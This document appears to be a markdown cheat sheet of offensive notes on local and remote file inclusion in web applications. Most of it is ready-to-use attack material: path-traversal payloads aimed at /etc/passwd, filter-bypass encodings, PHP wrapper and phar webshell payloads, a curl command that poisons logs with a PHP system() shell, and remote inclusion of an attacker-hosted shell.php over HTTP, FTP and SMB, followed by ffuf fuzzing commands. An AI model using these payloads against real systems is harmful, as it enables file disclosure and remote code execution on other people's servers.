# File Inclusion

Here we will address the major topics of file inclusion, which are:
- Local File Inclusion
- Remote File Inclusion


**Relative vs. Absolute Pathing**

Absolute Pathing

Let's execute a command with absolute pathing from our Kali Lab VM from the sample /etc/ working directory.
We'll run cat and provide /etc/group as an argument. By specifying a forward slash (/) at the beginning of our statement, we tell Linux that we're interested in the etc directory from a file system perspective. The / directory is known as the rootfs or "root file system" on Unix-based systems.
This technique is known as absolute pathing since, depending upon the operating system, we specify a path that includes a volume label, begins at the underlying root file system, and concludes some number of directories down the line with a file.

Relative Pathing

When working with relative pathing, we can always expect to encounter a reference URI or directory. This reference URI can be any file path on the target web server. However, when specifying the path, rather than starting in the rootfs (root file system) directory and moving over to a particular file, our query is much shorter as we already exist within the relative directory.
With our relative pathing example, we access the group file inside the /etc/ directory. The key difference in this case is that we did not instruct the Linux kernel to read /etc/group directly as an absolute path. Because both our relative directory and working directory are /etc/, we only needed to cat the group file. We've now demonstrated the difference between absolute and relative pathing.
In some cases, we'll need to take into account our distance from the root filesystem. We can use ../../../etc/group to read a particular file, but we might also need to use ../../../../../../../../../../../../etc/group, depending on the distance of the file from rootfs. We should keep in mind that the root directory would be the / directory on Unix-based systems, or the C:\ directory on a Windows machine.


## File Inclusion Functions

| Language | Function                 | Read Content | Execute | Remote URL |
|----------|--------------------------|--------------|---------|------------|
| PHP      | include()/include_once() | Yes          | Yes     | Yes        |
| PHP      | require()/require_once() | Yes          | Yes     | No         |
| PHP      | file_get_contents()      | Yes          | No      | Yes        |
| PHP      | fopen()/file()           | Yes          | No      | No         |
| NodeJS   | fs.readFile()             | Yes          | No      | No         |
| NodeJS   | fs.sendFile()             | Yes          | No      | No         |
| NodeJS   | res.render()              | Yes          | Yes     | No         |
| Java     | include                  | Yes          | No      | No         |
| Java     | import                   | Yes          | Yes     | Yes        |
| .NET     | @Html.Partial()           | Yes          | No      | No         |
| .NET     | @Html.RemotePartial()     | Yes          | No      | Yes        |
| .NET     | Response.WriteFile()      | Yes          | No      | No         |
| .NET     | include                  | Yes          | Yes     | Yes        |




## Local File Inclusion (LFI)

Many modern back-end languages, such as PHP, Javascript, or Java, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.


Default Conf Files (Apache & Nginx)
````
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/nginx/conf.d/default.conf
/etc/apache2/httpd.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx.access_log
/var/log/nginx.error_log
````

Examples of Parameters
````
?file=
?f=
/file/someFile

?location=
?l=
/location/someLocation

search=
s=
/search/someSearch

?data=
?d=
/data/someData

?download=
?d=
/download/someFileData
````

Examples of Payloads
````
../../../../etc/passwd
/etc/passwd
/../../../etc/passwd
````

**Second-Order Attacks**

For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.
In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a Second-Order attack.

### Bypass 

````
....//....//....//....//etc/passwd
....////....////....////etc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e%2f -> ../

./languages/../../../../etc/passwd
non_existing_directory/../../../etc/passwd/./././././
/etc/passwd%00
````

### PHP Filter & Wrappers

**Filter**
````
php://filter/read=convert.base64-encode/resource=config
````
**Wrapper**
````
Data
data://text/plain;base64,
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

Input
php://input&cmd=id

Expect
expect://id

Zip
- Upload webshell in zip file.zip
zip://./profile_images/shell.jpg%23shell.php&cmd=id

Phar
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
````

**Log Poisoning**

In this technique, we will inject PHP code, for example, into a parameter or header, and then, using LFI, we will read a log file where the value of that parameter appears, thereby executing our code.

````
/var/lib/php/sessions/sess_<PHPSESSID>

/var/log/apache2/access.log (User-Agent)
$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
/proc/self/environ
/proc/self/fd/N (where N is a PID usually between 0-50)

/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
````

## Remote File Inclusion

When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution.
In this scenario, instead of having the server load a file that is located on the server itself, we will have the server load a file that is on our machine.


| Language | Function                  | Read Content | Execute | Remote URL |
|----------|---------------------------|--------------|---------|------------|
| PHP      | include()/include_once()  | ✅            | ✅       | ✅          |
| PHP      | file_get_contents()       | ✅            | ❌       | ✅          |
| Java     | import                    | ✅            | ✅       | ✅          |
| .NET     | @Html.RemotePartial()     | ✅            | ❌       | ✅          |
| .NET     | include                   | ✅            | ✅       | ✅          |

**Example**

HTTP
````
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ sudo python3 -m http.server <LISTENING_PORT>
?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
````
FTP
````
$ sudo python -m pyftpdlib -p 21
?language=ftp://<OUR_IP>/shell.php&cmd=id
````
SMB
````
$ impacket-smbserver -smb2support share $(pwd)
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
````

## Automated Scanning

- Fuzzing Parameters
- LFI wordlists

````
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
````
````
$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
````

- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
- https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt

